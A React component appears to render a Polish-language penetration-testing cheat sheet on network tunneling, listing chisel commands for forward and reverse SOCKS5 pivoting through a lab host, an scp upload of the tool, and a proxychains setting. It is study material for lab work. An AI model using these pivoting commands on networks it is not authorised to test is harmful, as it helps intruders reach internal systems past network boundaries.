import tunneling_attack from '../../assets/tunneling_attack.png';
import tunneling_host from '../../assets/tunneling_host.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const Tunneling = () =>{
    return(
        <section>
            <h1>Tunneling</h1>

            <h2>Przesłanie chisel</h2>
            <div className="waring">
                <p>scp chisel ubuntu@10.129.202.64:~/</p>
            </div>
            <div className="waring">
                <p><span className="important">Attack server</span></p>
                <p>./chisel server -v -p 1234 --socks5</p>
                <ExampleFrame screen={tunneling_attack} />
            </div>
            <div className="waring">
                <p><span className="important">Nasz host</span></p>
                <p>./chisel client -v 10.129.202.64:1234 socks</p>
                <ExampleFrame screen={tunneling_host} />
            </div>

            <hr />
            <h2>Reverse chisel</h2>

            <div className="waring">
                <p><span className="important">Attack server</span></p>
                <p>./chisel client -v 10.10.14.17:1234 R:socks</p>
            </div>
            <div className="waring">
                <p><span className="important">Nasz host</span></p>
                <p>./chisel server --reverse -v -p 1234 --socks5</p>
            </div>

            <div className='waring'>
                <p>Zaktualizować <span className='important'>/etc/proxychains.conf</span> -{'>'}  <span className='important'>socks5 127.0.0.1 1080</span></p>
            </div>
        </section>
    )
}

export default Tunneling;